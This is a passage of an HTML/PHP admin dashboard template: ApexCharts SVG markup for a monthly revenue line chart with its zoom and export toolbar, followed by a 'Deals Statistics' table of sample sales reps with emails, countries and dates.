                                          pathFrom="M 0 219.91320000000002C 18.93933771306818 219.91320000000002 35.17305575284091 193.03492 54.112393465909086 193.03492C 73.05173117897726 193.03492 89.28544921874999 200.36536 108.22478693181817 200.36536C 127.16412464488636 200.36536 143.39784268465908 133.414008 162.33718039772725 133.414008C 181.27651811079542 133.414008 197.51023615056818 188.14796 216.44957386363635 188.14796C 235.38891157670452 188.14796 251.62262961647727 166.15664 270.56196732954544 166.15664C 289.5013050426136 166.15664 305.7350230823863 84.055712 324.6743607954545 84.055712C 343.6136985085227 84.055712 359.8474165482954 41.53915999999998 378.7867542613636 41.53915999999998C 397.7260919744318 41.53915999999998 413.95981001420455 158.8262 432.8991477272727 158.8262C 451.8384854403409 158.8262 468.0722034801136 158.8262 487.0115411931818 158.8262C 505.95087890624995 158.8262 522.1845969460227 193.03492 541.1239346590909 193.03492C 560.0632723721591 193.03492 576.2969904119318 144.16532 595.236328125 144.16532"
                                          fill-rule="evenodd"
                                        ></path>
                                        <g
                                          id="SvgjsG3518"
                                          class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                          data:realIndex="0"
                                        >
                                          <g class="apexcharts-series-markers">
                                            <circle
                                              id="SvgjsCircle3620"
                                              r="0"
                                              cx="0"
                                              cy="0"
                                              class="apexcharts-marker wmwa6eahsh"
                                              stroke="#ffffff"
                                              fill="rgba(132,90,223, 1)"
                                              fill-opacity="1"
                                              stroke-width="2"
                                              stroke-opacity="0.9"
                                              default-marker-size="0"
                                            ></circle>
                                          </g>
                                        </g>
                                      </g>
                                      <g
                                        id="SvgjsG3530"
                                        class="apexcharts-series"
                                        seriesName="Revenue"
                                        data:longestSeries="true"
                                        rel="2"
                                        data:realIndex="1"
                                      >
                                        <path
                                          id="SvgjsPath3533"
                                          d="M 0 200.36536C 18.93933771306818 200.36536 35.17305575284091 92.85224 54.112393465909086 92.85224C 73.05173117897726 92.85224 89.28544921874999 128.038352 108.22478693181817 128.038352C 127.16412464488636 128.038352 143.39784268465908 190.59144 162.33718039772725 190.59144C 181.27651811079542 190.59144 197.51023615056818 117.28703999999999 216.44957386363635 117.28703999999999C 235.38891157670452 117.28703999999999 251.62262961647727 53.75655999999998 270.56196732954544 53.75655999999998C 289.5013050426136 53.75655999999998 305.7350230823863 138.05662 324.6743607954545 138.05662C 343.6136985085227 138.05662 359.8474165482954 118.50878 378.7867542613636 118.50878C 397.7260919744318 118.50878 413.95981001420455 64.01917599999999 432.8991477272727 64.01917599999999C 451.8384854403409 64.01917599999999 468.0722034801136 133.414008 487.0115411931818 133.414008C 505.95087890624995 133.414008 522.1845969460227 116.06530000000001 541.1239346590909 116.06530000000001C 560.0632723721591 116.06530000000001 576.2969904119318 188.14796 595.236328125 188.14796"
                                          fill="none"
                                          fill-opacity="1"
                                          stroke="rgba(35, 183, 229, 0.85)"
                                          stroke-opacity="1"
                                          stroke-linecap="butt"
                                          stroke-width="2"
                                          stroke-dasharray="5"
                                          class="apexcharts-line"
                                          index="1"
                                          clip-path="url(#gridRectMaskwuayproi)"
                                          filter="url(#SvgjsFilter3534)"
                                          pathTo="M 0 200.36536C 18.93933771306818 200.36536 35.17305575284091 92.85224 54.112393465909086 92.85224C 73.05173117897726 92.85224 89.28544921874999 128.038352 108.22478693181817 128.038352C 127.16412464488636 128.038352 143.39784268465908 190.59144 162.33718039772725 190.59144C 181.27651811079542 190.59144 197.51023615056818 117.28703999999999 216.44957386363635 117.28703999999999C 235.38891157670452 117.28703999999999 251.62262961647727 53.75655999999998 270.56196732954544 53.75655999999998C 289.5013050426136 53.75655999999998 305.7350230823863 138.05662 324.6743607954545 138.05662C 343.6136985085227 138.05662 359.8474165482954 118.50878 378.7867542613636 118.50878C 397.7260919744318 118.50878 413.95981001420455 64.01917599999999 432.8991477272727 64.01917599999999C 451.8384854403409 64.01917599999999 468.0722034801136 133.414008 487.0115411931818 133.414008C 505.95087890624995 133.414008 522.1845969460227 116.06530000000001 541.1239346590909 116.06530000000001C 560.0632723721591 116.06530000000001 576.2969904119318 188.14796 595.236328125 188.14796"
                                          pathFrom="M 0 200.36536C 18.93933771306818 200.36536 35.17305575284091 92.85224 54.112393465909086 92.85224C 73.05173117897726 92.85224 89.28544921874999 128.038352 108.22478693181817 128.038352C 127.16412464488636 128.038352 143.39784268465908 190.59144 162.33718039772725 190.59144C 181.27651811079542 190.59144 197.51023615056818 117.28703999999999 216.44957386363635 117.28703999999999C 235.38891157670452 117.28703999999999 251.62262961647727 53.75655999999998 270.56196732954544 53.75655999999998C 289.5013050426136 53.75655999999998 305.7350230823863 138.05662 324.6743607954545 138.05662C 343.6136985085227 138.05662 359.8474165482954 118.50878 378.7867542613636 118.50878C 397.7260919744318 118.50878 413.95981001420455 64.01917599999999 432.8991477272727 64.01917599999999C 451.8384854403409 64.01917599999999 468.0722034801136 133.414008 487.0115411931818 133.414008C 505.95087890624995 133.414008 522.1845969460227 116.06530000000001 541.1239346590909 116.06530000000001C 560.0632723721591 116.06530000000001 576.2969904119318 188.14796 595.236328125 188.14796"
                                          fill-rule="evenodd"
                                        ></path>
                                        <g
                                          id="SvgjsG3531"
                                          class="apexcharts-series-markers-wrap apexcharts-hidden-element-shown"
                                          data:realIndex="1"
                                        >
                                          <g class="apexcharts-series-markers">
                                            <circle
                                              id="SvgjsCircle3621"
                                              r="0"
                                              cx="0"
                                              cy="0"
                                              class="apexcharts-marker wft5quvchg"
                                              stroke="#ffffff"
                                              fill="rgba(35, 183, 229, 0.85)"
                                              fill-opacity="1"
                                              stroke-width="2"
                                              stroke-opacity="0.9"
                                              default-marker-size="0"
                                            ></circle>
                                          </g>
                                        </g>
                                      </g>
                                      <g
                                        id="SvgjsG3495"
                                        class="apexcharts-datalabels"
                                        data:realIndex="2"
                                      ></g>
                                      <g
                                        id="SvgjsG3519"
                                        class="apexcharts-datalabels"
                                        data:realIndex="0"
                                      ></g>
                                      <g
                                        id="SvgjsG3532"
                                        class="apexcharts-datalabels"
                                        data:realIndex="1"
                                      ></g>
                                    </g>
                                    <line
                                      id="SvgjsLine3555"
                                      x1="0"
                                      y1="0"
                                      x2="595.236328125"
                                      y2="0"
                                      stroke="#b6b6b6"
                                      stroke-dasharray="0"
                                      stroke-width="1"
                                      stroke-linecap="butt"
                                      class="apexcharts-ycrosshairs"
                                    ></line>
                                    <line
                                      id="SvgjsLine3556"
                                      x1="0"
                                      y1="0"
                                      x2="595.236328125"
                                      y2="0"
                                      stroke-dasharray="0"
                                      stroke-width="0"
                                      stroke-linecap="butt"
                                      class="apexcharts-ycrosshairs-hidden"
                                    ></line>
                                    <g
                                      id="SvgjsG3557"
                                      class="apexcharts-xaxis"
                                      transform="translate(0, 0)"
                                    >
                                      <g
                                        id="SvgjsG3558"
                                        class="apexcharts-xaxis-texts-g"
                                        transform="translate(0, -4)"
                                      >
                                        <text
                                          id="SvgjsText3560"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="0"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3561">Jan</tspan>
                                          <title>Jan</title>
                                        </text>
                                        <text
                                          id="SvgjsText3563"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="54.11239346590909"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3564">Feb</tspan>
                                          <title>Feb</title>
                                        </text>
                                        <text
                                          id="SvgjsText3566"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="108.2247869318182"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3567">Mar</tspan>
                                          <title>Mar</title>
                                        </text>
                                        <text
                                          id="SvgjsText3569"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="162.3371803977273"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3570">Apr</tspan>
                                          <title>Apr</title>
                                        </text>
                                        <text
                                          id="SvgjsText3572"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="216.44957386363637"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3573">May</tspan>
                                          <title>May</title>
                                        </text>
                                        <text
                                          id="SvgjsText3575"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="270.56196732954544"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3576">Jun</tspan>
                                          <title>Jun</title>
                                        </text>
                                        <text
                                          id="SvgjsText3578"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="324.67436079545456"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3579">Jul</tspan>
                                          <title>Jul</title>
                                        </text>
                                        <text
                                          id="SvgjsText3581"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="378.7867542613637"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3582">Aug</tspan>
                                          <title>Aug</title>
                                        </text>
                                        <text
                                          id="SvgjsText3584"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="432.8991477272728"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3585">Sep</tspan>
                                          <title>Sep</title>
                                        </text>
                                        <text
                                          id="SvgjsText3587"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="487.0115411931819"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3588">Oct</tspan>
                                          <title>Oct</title>
                                        </text>
                                        <text
                                          id="SvgjsText3590"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="541.1239346590911"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3591">Nov</tspan>
                                          <title>Nov</title>
                                        </text>
                                        <text
                                          id="SvgjsText3593"
                                          font-family="Helvetica, Arial, sans-serif"
                                          x="595.2363281250002"
                                          y="273.348"
                                          text-anchor="middle"
                                          dominant-baseline="auto"
                                          font-size="12px"
                                          font-weight="400"
                                          fill="#373d3f"
                                          class="apexcharts-text apexcharts-xaxis-label"
                                          style="
                                            font-family: Helvetica, Arial,
                                              sans-serif;
                                          "
                                        >
                                          <tspan id="SvgjsTspan3594">Dec</tspan>
                                          <title>Dec</title>
                                        </text>
                                      </g>
                                    </g>
                                    <g
                                      id="SvgjsG3616"
                                      class="apexcharts-yaxis-annotations"
                                    ></g>
                                    <g
                                      id="SvgjsG3617"
                                      class="apexcharts-xaxis-annotations"
                                    ></g>
                                    <g
                                      id="SvgjsG3618"
                                      class="apexcharts-point-annotations"
                                    ></g>
                                    <rect
                                      id="SvgjsRect3622"
                                      width="0"
                                      height="0"
                                      x="0"
                                      y="0"
                                      rx="0"
                                      ry="0"
                                      opacity="1"
                                      stroke-width="0"
                                      stroke="none"
                                      stroke-dasharray="0"
                                      fill="#fefefe"
                                      class="apexcharts-zoom-rect"
                                    ></rect>
                                    <rect
                                      id="SvgjsRect3623"
                                      width="0"
                                      height="0"
                                      x="0"
                                      y="0"
                                      rx="0"
                                      ry="0"
                                      opacity="1"
                                      stroke-width="0"
                                      stroke="none"
                                      stroke-dasharray="0"
                                      fill="#fefefe"
                                      class="apexcharts-selection-rect"
                                    ></rect>
                                  </g>
                                </svg>
                                <div
                                  class="apexcharts-tooltip apexcharts-theme-light"
                                >
                                  <div
                                    class="apexcharts-tooltip-title"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                      font-size: 12px;
                                    "
                                  ></div>
                                  <div
                                    class="apexcharts-tooltip-series-group"
                                    style="order: 1"
                                  >
                                    <span
                                      class="apexcharts-tooltip-marker"
                                      style="
                                        background-color: rgb(132, 90, 223);
                                      "
                                    ></span>
                                    <div
                                      class="apexcharts-tooltip-text"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                        font-size: 12px;
                                      "
                                    >
                                      <div class="apexcharts-tooltip-y-group">
                                        <span
                                          class="apexcharts-tooltip-text-y-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-y-value"
                                        ></span>
                                      </div>
                                      <div
                                        class="apexcharts-tooltip-goals-group"
                                      >
                                        <span
                                          class="apexcharts-tooltip-text-goals-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-goals-value"
                                        ></span>
                                      </div>
                                      <div class="apexcharts-tooltip-z-group">
                                        <span
                                          class="apexcharts-tooltip-text-z-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-z-value"
                                        ></span>
                                      </div>
                                    </div>
                                  </div>
                                  <div
                                    class="apexcharts-tooltip-series-group"
                                    style="order: 2"
                                  >
                                    <span
                                      class="apexcharts-tooltip-marker"
                                      style="
                                        background-color: rgba(
                                          35,
                                          183,
                                          229,
                                          0.85
                                        );
                                      "
                                    ></span>
                                    <div
                                      class="apexcharts-tooltip-text"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                        font-size: 12px;
                                      "
                                    >
                                      <div class="apexcharts-tooltip-y-group">
                                        <span
                                          class="apexcharts-tooltip-text-y-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-y-value"
                                        ></span>
                                      </div>
                                      <div
                                        class="apexcharts-tooltip-goals-group"
                                      >
                                        <span
                                          class="apexcharts-tooltip-text-goals-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-goals-value"
                                        ></span>
                                      </div>
                                      <div class="apexcharts-tooltip-z-group">
                                        <span
                                          class="apexcharts-tooltip-text-z-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-z-value"
                                        ></span>
                                      </div>
                                    </div>
                                  </div>
                                  <div
                                    class="apexcharts-tooltip-series-group"
                                    style="order: 3"
                                  >
                                    <span
                                      class="apexcharts-tooltip-marker"
                                      style="
                                        background-color: rgba(
                                          119,
                                          119,
                                          142,
                                          0.05
                                        );
                                      "
                                    ></span>
                                    <div
                                      class="apexcharts-tooltip-text"
                                      style="
                                        font-family: Helvetica, Arial,
                                          sans-serif;
                                        font-size: 12px;
                                      "
                                    >
                                      <div class="apexcharts-tooltip-y-group">
                                        <span
                                          class="apexcharts-tooltip-text-y-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-y-value"
                                        ></span>
                                      </div>
                                      <div
                                        class="apexcharts-tooltip-goals-group"
                                      >
                                        <span
                                          class="apexcharts-tooltip-text-goals-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-goals-value"
                                        ></span>
                                      </div>
                                      <div class="apexcharts-tooltip-z-group">
                                        <span
                                          class="apexcharts-tooltip-text-z-label"
                                        ></span
                                        ><span
                                          class="apexcharts-tooltip-text-z-value"
                                        ></span>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div
                                  class="apexcharts-xaxistooltip apexcharts-xaxistooltip-bottom apexcharts-theme-light"
                                >
                                  <div
                                    class="apexcharts-xaxistooltip-text"
                                    style="
                                      font-family: Helvetica, Arial, sans-serif;
                                      font-size: 12px;
                                    "
                                  ></div>
                                </div>
                                <div
                                  class="apexcharts-yaxistooltip apexcharts-yaxistooltip-0 apexcharts-yaxistooltip-left apexcharts-theme-light"
                                >
                                  <div
                                    class="apexcharts-yaxistooltip-text"
                                  ></div>
                                </div>
                                <div
                                  class="apexcharts-toolbar"
                                  style="top: 0px; right: 3px"
                                >
                                  <div
                                    class="apexcharts-zoomin-icon"
                                    title="Zoom In"
                                  >
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                    >
                                      <path
                                        d="M0 0h24v24H0z"
                                        fill="none"
                                      ></path>
                                      <path
                                        d="M13 7h-2v4H7v2h4v4h2v-4h4v-2h-4V7zm-1-5C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div
                                    class="apexcharts-zoomout-icon"
                                    title="Zoom Out"
                                  >
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                    >
                                      <path
                                        d="M0 0h24v24H0z"
                                        fill="none"
                                      ></path>
                                      <path
                                        d="M7 11v2h10v-2H7zm5-9C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div
                                    class="apexcharts-zoom-icon apexcharts-selected"
                                    title="Selection Zoom"
                                  >
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      fill="#000000"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      width="24"
                                    >
                                      <path
                                        d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"
                                      ></path>
                                      <path
                                        d="M0 0h24v24H0V0z"
                                        fill="none"
                                      ></path>
                                      <path
                                        d="M12 10h-2v2H9v-2H7V9h2V7h1v2h2v1z"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div
                                    class="apexcharts-pan-icon"
                                    title="Panning"
                                  >
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      xmlns:xlink="http://www.w3.org/1999/xlink"
                                      fill="#000000"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      width="24"
                                    >
                                      <defs>
                                        <path d="M0 0h24v24H0z" id="a"></path>
                                      </defs>
                                      <clipPath id="b">
                                        <use
                                          overflow="visible"
                                          xlink:href="#a"
                                        ></use>
                                      </clipPath>
                                      <path
                                        clip-path="url(#b)"
                                        d="M23 5.5V20c0 2.2-1.8 4-4 4h-7.3c-1.08 0-2.1-.43-2.85-1.19L1 14.83s1.26-1.23 1.3-1.25c.22-.19.49-.29.79-.29.22 0 .42.06.6.16.04.01 4.31 2.46 4.31 2.46V4c0-.83.67-1.5 1.5-1.5S11 3.17 11 4v7h1V1.5c0-.83.67-1.5 1.5-1.5S15 .67 15 1.5V11h1V2.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5V11h1V5.5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5z"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div
                                    class="apexcharts-reset-icon"
                                    title="Reset Zoom"
                                  >
                                    <svg
                                      fill="#000000"
                                      height="24"
                                      viewBox="0 0 24 24"
                                      width="24"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"
                                      ></path>
                                      <path
                                        d="M0 0h24v24H0z"
                                        fill="none"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div
                                    class="apexcharts-menu-icon"
                                    title="Menu"
                                  >
                                    <svg
                                      xmlns="http://www.w3.org/2000/svg"
                                      width="24"
                                      height="24"
                                      viewBox="0 0 24 24"
                                    >
                                      <path
                                        fill="none"
                                        d="M0 0h24v24H0V0z"
                                      ></path>
                                      <path
                                        d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"
                                      ></path>
                                    </svg>
                                  </div>
                                  <div class="apexcharts-menu">
                                    <div
                                      class="apexcharts-menu-item exportSVG"
                                      title="Download SVG"
                                    >
                                      Download SVG
                                    </div>
                                    <div
                                      class="apexcharts-menu-item exportPNG"
                                      title="Download PNG"
                                    >
                                      Download PNG
                                    </div>
                                    <div
                                      class="apexcharts-menu-item exportCSV"
                                      title="Download CSV"
                                    >
                                      Download CSV
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="col-xl-12">
                  <div class="card custom-card">
                    <div class="card-header justify-content-between">
                      <div class="card-title">Deals Statistics</div>
                      <div class="d-flex flex-wrap gap-2">
                        <div>
                          <input
                            class="form-control form-control-sm"
                            type="text"
                            placeholder="Search Here"
                            aria-label=".form-control-sm example"
                          />
                        </div>
                        <div class="dropdown">
                          <a
                            href="javascript:void(0);"
                            class="btn btn-primary btn-sm btn-wave waves-effect waves-light"
                            data-bs-toggle="dropdown"
                            aria-expanded="false"
                          >
                            Sort By<i
                              class="ri-arrow-down-s-line align-middle ms-1 d-inline-block"
                            ></i>
                          </a>
                          <ul class="dropdown-menu" role="menu">
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >New</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Popular</a
                              >
                            </li>
                            <li>
                              <a
                                class="dropdown-item"
                                href="javascript:void(0);"
                                >Relevant</a
                              >
                            </li>
                          </ul>
                        </div>
                      </div>
                    </div>
                    <div class="card-body">
                      <div class="table-responsive">
                        <table
                          class="table text-nowrap table-hover border table-bordered"
                        >
                          <thead>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel1"
                                  value=""
                                  aria-label="..."
                                />
                              </th>
                              <th scope="col">Sales Rep</th>
                              <th scope="col">Category</th>
                              <th scope="col">Mail</th>
                              <th scope="col">Location</th>
                              <th scope="col">Date</th>
                              <th scope="col">Action</th>
                            </tr>
                          </thead>
                          <tbody>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel2"
                                  value=""
                                  aria-label="..."
                                />
                              </th>
                              <td>
                                <div
                                  class="d-flex align-items-center fw-semibold"
                                >
                                  <span
                                    class="avatar avatar-sm me-2 avatar-rounded"
                                  >
                                    <img
                                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/4.jpg"
                                      alt="img"
                                    /> </span
                                  >Mayor Kelly
                                </div>
                              </td>
                              <td>Manufacture</td>
                              <td>mayorkelly@gmail.com</td>
                              <td>
                                <span class="badge bg-info-transparent"
                                  >Germany</span
                                >
                              </td>
                              <td>Sep 15 - Oct 12, 2023</td>
                              <td>
                                <div class="hstack gap-2 fs-15">
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon btn-wave waves-effect waves-light btn-sm btn-success-light"
                                    ><i class="ri-download-2-line"></i
                                  ></a>
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon btn-wave waves-effect waves-light btn-sm btn-primary-light"
                                    ><i class="ri-edit-line"></i
                                  ></a>
                                </div>
                              </td>
                            </tr>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel13"
                                  value=""
                                  aria-label="..."
                                  checked=""
                                />
                              </th>
                              <td>
                                <div
                                  class="d-flex align-items-center fw-semibold"
                                >
                                  <span
                                    class="avatar avatar-sm me-2 avatar-rounded"
                                  >
                                    <img
                                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/15.jpg"
                                      alt="img"
                                    /> </span
                                  >Andrew Garfield
                                </div>
                              </td>
                              <td>Development</td>
                              <td>andrewgarfield@gmail.com</td>
                              <td>
                                <span class="badge bg-primary-transparent"
                                  >Canada</span
                                >
                              </td>
                              <td>Apr 10 - Dec 12, 2023</td>
                              <td>
                                <div class="hstack gap-2 fs-15">
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-success-light"
                                    ><i class="ri-download-2-line"></i
                                  ></a>
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-primary-light"
                                    ><i class="ri-edit-line"></i
                                  ></a>
                                </div>
                              </td>
                            </tr>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel4"
                                  value=""
                                  aria-label="..."
                                />
                              </th>
                              <td>
                                <div
                                  class="d-flex align-items-center fw-semibold"
                                >
                                  <span
                                    class="avatar avatar-sm me-2 avatar-rounded"
                                  >
                                    <img
                                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/11.jpg"
                                      alt="img"
                                    /> </span
                                  >Simon Cowel
                                </div>
                              </td>
                              <td>Service</td>
                              <td>simoncowel234@gmail.com</td>
                              <td>
                                <span class="badge bg-danger-transparent"
                                  >Europe</span
                                >
                              </td>
                              <td>Sep 15 - Oct 12, 2023</td>
                              <td>
                                <div class="hstack gap-2 fs-15">
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-success-light"
                                    ><i class="ri-download-2-line"></i
                                  ></a>
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-primary-light"
                                    ><i class="ri-edit-line"></i
                                  ></a>
                                </div>
                              </td>
                            </tr>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel5"
                                  value=""
                                  aria-label="..."
                                  checked=""
                                />
                              </th>
                              <td>
                                <div
                                  class="d-flex align-items-center fw-semibold"
                                >
                                  <span
                                    class="avatar avatar-sm me-2 avatar-rounded"
                                  >
                                    <img
                                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/8.jpg"
                                      alt="img"
                                    /> </span
                                  >Mirinda Hers
                                </div>
                              </td>
                              <td>Marketing</td>
                              <td>mirindahers@gmail.com</td>
                              <td>
                                <span class="badge bg-warning-transparent"
                                  >USA</span
                                >
                              </td>
                              <td>Apr 14 - Dec 14, 2023</td>
                              <td>
                                <div class="hstack gap-2 fs-15">
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-success-light"
                                    ><i class="ri-download-2-line"></i
                                  ></a>
                                  <a
                                    aria-label="anchor"
                                    href="javascript:void(0);"
                                    class="btn btn-icon waves-effect waves-light btn-sm btn-primary-light"
                                    ><i class="ri-edit-line"></i
                                  ></a>
                                </div>
                              </td>
                            </tr>
                            <tr>
                              <th scope="row" class="ps-4">
                                <input
                                  class="form-check-input"
                                  type="checkbox"
                                  id="checkboxNoLabel3"
                                  value=""
                                  aria-label="..."
                                  checked=""
                                />
                              </th>
                              <td>
                                <div
                                  class="d-flex align-items-center fw-semibold"
                                >
                                  <span
                                    class="avatar avatar-sm me-2 avatar-rounded"
                                  >
                                    <img
                                      src="<?php echo base_url('public/admin') ?>/assets/images/faces/9.jpg"
                                      alt="img"
                                    /> </span
                                  >Jacob Smith
                                </div>
                              </td>
                              <td>Social Plataform</td>
                              <td>jacobsmith@gmail.com</td>
                              <td>
                                <span class="badge bg-success-transparent"
                                  >Singapore</span
                                >
                              </td>
                              <td>Feb 25 - Nov 25, 2023</td>
                              <td>
                                <div class="hstack gap-2 fs-15">
                                  <a
